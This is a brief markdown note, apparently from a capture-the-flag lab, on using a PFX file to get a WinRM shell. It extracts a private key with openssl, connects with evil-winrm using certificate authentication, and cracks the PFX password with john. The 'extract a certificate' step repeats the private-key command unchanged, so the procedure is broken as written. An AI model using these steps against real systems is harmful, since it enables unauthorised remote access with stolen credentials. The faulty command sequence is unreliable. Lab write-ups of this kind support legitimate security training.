# Use pfx to connect to wirm
1. Extract the private key
```bash
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -nodes -out priv.key
```
2. Extract a Certificate
```bash
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -nodes -out priv.key
```
3. Connect to winrm
```bash
evil-winrm -S -c cert.crt -k priv.key -i <IP> -u -p
```
> Use john to crack the password